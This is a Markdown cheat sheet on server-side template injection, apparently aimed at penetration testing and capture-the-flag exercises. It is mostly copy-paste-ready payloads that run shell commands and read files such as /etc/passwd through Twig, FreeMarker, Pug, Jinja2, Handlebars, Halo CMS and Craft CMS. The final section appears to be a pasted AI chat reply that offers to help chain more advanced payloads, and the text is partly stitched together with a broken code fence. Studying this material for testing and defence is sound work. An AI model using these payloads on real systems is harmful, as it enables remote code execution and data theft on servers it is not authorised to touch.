# Server-Side Template Injection (SSTI) - Discovery and Exploitation Guide

> Author: Offensive Security Enthusiast
> Last Updated: 2025-05-20

---

## Table of Contents

* [What is SSTI?](#what-is-ssti)
* [General Detection Payloads](#general-detection-payloads)
* [Twig](#twig)
* [Apache FreeMarker](#apache-freemarker)
* [Pug (formerly Jade)](#pug-formerly-jade)
* [Jinja2 (Python)](#jinja2-python)
* [Mustache & Handlebars (JS)](#mustache--handlebars-js)
* [Halo CMS](#halo-cms)
* [Craft CMS](#craft-cms)
* [References](#references)

---

## What is SSTI?

**Server-Side Template Injection (SSTI)** occurs when user-controlled input is unsafely embedded into a server-side template engine. If exploitable, attackers can execute arbitrary code, read files, or perform RCE.

---

## General Detection Payloads

Use these to identify SSTI vulnerabilities:

```text
{{7*7}}        # Twig, Jinja2
${7*7}         # FreeMarker, Velocity
<%= 7*7 %>     # Pug, EJS
{{= 7*7 }}     # Handlebars/Mustache
```

Check for a response containing `49`. If yes, it's likely vulnerable.

---

## Twig

**Language**: PHP
**Used in**: Symfony, Laravel, Craft CMS

### Detection

```twig
{{7*7}}                    # -> 49
{{['A','B']|join}}         # -> AB
```

### Exploitation

```twig
{{_self.env.registerUndefinedFilterCallback('system')}}
{{'cat /etc/passwd'|filter}}
```

```twig
{{ ['cat /var/www/flag.txt']|map('system') }}
```

```twig
{{[0]|reduce('system','cat /var/www/flag.txt')}}
```


### File Read Example

```twig
{{ constant('file_get_contents')('/var/www/flag.txt') }}
```

---

## Apache FreeMarker

```url
https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html
```

```url
https://freemarker.apache.org/docs/app_faq.html
```

**Language**: Java

### Detection

```ftl
${7*7}     # -> 49
${"freemarker"?api}  # See available methods
```

### Exploitation (Read files)

```ftl
${"freemarker.template.utility.Execute"?new()("whoami")}
```

```ftl
<#assign x = "freemarker.template.utility.Execute"?new()>
${x("cat /etc/passwd")}
```

---

## Pug (formerly Jade)

**Language**: JavaScript (Node.js)

### Detection

```pug
= 7 * 7      # -> 49
- console.log(process.env)  # Look for output in logs
```

### Exploitation (RCE)

```pug
- var require = global.process.mainModule.require
= require('child_process')
```

```pug
- var require = global.process.mainModule.require
= require('child_process').spawnSync('whoami').stdout
```

```pug
- var exec = require('child_process').execSync
= exec('cat /etc/passwd')
```

```pug
- var require = global.process.mainModule.require
= require('child_process').spawnSync('cat', ['flag.txt']).stdout
```



---

## Jinja2 (Python)

**Used in**: Flask, Ansible, SaltStack

### Detection

To find out whether a target is running Jinja, we can leverage the fact that Python handles variables differently than languages like PHP, Java, and JavaScript. For example, if we were to use {{5*5}} as a payload, we would expect "25" as the output. However, what would the output be if we were to use {{5*"5"}}? Let's try it out.

```jinja
{{5*"5"}}
```

In this case, the engine didn't multiply the variables; instead, it displayed "5" five times. This is a great indicator that the target is running Jinja.

Another indicator we can leverage is accessing global variables. These variables are often set by the framework in use. Jinja is developed by the same organization that developed the Flask framework, which is why they are usually paired together. Reviewing the documentation, we learn that Flask sets six global variables: config, request, session, g, url_for(), and get_flashed_messages(). Let's try to use {{ request }} as the payload.

```jinja
{{request}}
```

```jinja
{{config|pprint}}
```

```jinja
{{ config.flag }}
```

```jinja
{{config.items()}} # Flask-specific
```

### Exploitation

```jinja
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

---

## Mustache & Handlebars (JavaScript)

### Detection

```handlebars
{{#each (readdir "/etc")}}
   {{this}}
{{/each}}
```

```handlebars
{{read "/etc/passwd"}}
```

```handlebars
{{7*7}}      # Will likely render as-is unless logic-less extensions exist
```

**Note**: Logic-less — needs extensions to be exploitable.

### Possible Exploitation (Handlebars with helpers)

```js
{{#with (lookup this "constructor")}}
  {{#with (lookup this "constructor")}}
    {{eval "process.mainModule.require('child_process').execSync('cat /etc/passwd')"}}
  {{/with}}
{{/with}}
```

---

## Halo CMS

**Language**: Java
**Uses**: FreeMarker internally

### Exploitation

```ftl
<#assign x = "freemarker.template.utility.Execute"?new()>
${x("cat /flag")}
```

The expression in the template was translated to the static variable. Given the file extension and the style of expression, we can assume that this is using the Freemarker templating engine. Let's perform some additional tests to verify this. We'll start by using double curly-brackets to multiply a number. If we are indeed working with Freemarker, we expect that this won't do much since these are not the delimiters that it uses. Let's add this payload to the end of the template. 

```freemaker
{{5*5}}
```

We'll click save on this document and use curl to review the output.

```shell
curl -L http://halo/DoesNotExist
```

As expected, the value is not rendered. Let's try replacing the double curly-brackets with the default Freemarker delimiter.

```freemaker
${5*5}
```

```shell
curl -L http://halo/DoesNotExist
``` 

Next, let's try to change one of the numbers from an integer to a string. If an error is returned, this will confirm that the templating engine is Freemarker. In some cases, this test might crash the entire application, so we should proceed cautiously.

```fremaker
${5*'5'}
```

This time, we'll send a request and display the headers (with -i) so that we can examine the response code.

```shell
curl -L http://halo/DoesNotExist -i
```

The response indicates that multiplying a string and integer crashed the templating engine. At this point, we are very confident we're working with the Freemarker templating engine.

Let's build a payload that will execute commands on the target. We'll start by reviewing the rudimentary Freemarker expression to execute a command.

```html
${"freemarker.template.utility.Execute"?new()("whoami")}
```
 or 

```shell
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
```


---

## Craft CMS

**Language**: PHP
**Template Engine**: Twig

### Detection / Exploitation

Same as Twig:
```
```twig
{{ _self.env.registerUndefinedFilterCallback('system') }}
{{ 'cat /etc/passwd'|filter }}
```

Look for variables like:

```twig
{% for k, v in _context %}{{k}}: {{v}}<br>{% endfor %}
```

---

## References

* [PortSwigger SSTI Cheat Sheet](https://portswigger.net/web-security/server-side-template-injection)
* [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
* [Craft CMS Security](https://craftcms.com/security)
* [Twig Documentation](https://twig.symfony.com/doc/)
* [FreeMarker Manual](https://freemarker.apache.org/docs/)

---

**Disclaimer**: Use this information only on systems you are authorized to test.

PHP Functions That Can Execute External Programs

Many PHP functions can execute commands. Here are common ones that accept a single argument (ideal for reduce()):
Function	Description	Usage Example
system()	Executes a command and outputs	system('id')
exec()	Executes and returns last line	exec('ls')
shell_exec()	Executes via shell and returns output	shell_exec('whoami')
passthru()	Executes and outputs raw result	passthru('cat /etc/passwd')
popen()	Opens process pipe (requires fread)	Not usable with reduce() alone
proc_open()	Too complex — not usable here	❌
🔧 Try These Payloads (Replace system with each)

```twig
{{ [0]|reduce('shell_exec','cat /var/www/flag.txt') }}
{{ [0]|reduce('exec','cat /var/www/flag.txt') }}
{{ [0]|reduce('passthru','cat /var/www/flag.txt') }}
```

💡 These are copy/paste ready. Just try each and see which works.
🧪 What's Happening?

With Twig's reduce, the syntax is:

array|reduce(callback_function, initial_value)

So with:

```twig
[0]|reduce('shell_exec', 'cat /var/www/flag.txt')
```

You're effectively executing:

shell_exec('cat /var/www/flag.txt');

Which returns the flag if allowed.
🚨 Important Notes

    Some PHP functions like popen() or proc_open() need more than one argument or extra handling, so they won't work with reduce() directly.

    If one function doesn't work, try the next — it might be due to sandbox restrictions.

✅ Summary

Try each of these in your Twig sandbox:

```twig
{{ [0]|reduce('shell_exec','cat /var/www/flag.txt') }}
{{ [0]|reduce('exec','cat /var/www/flag.txt') }}
{{ [0]|reduce('passthru','cat /var/www/flag.txt') }}
```

If successful, you’ll see the flag displayed. Let me know the output or if you want help chaining more advanced payloads!
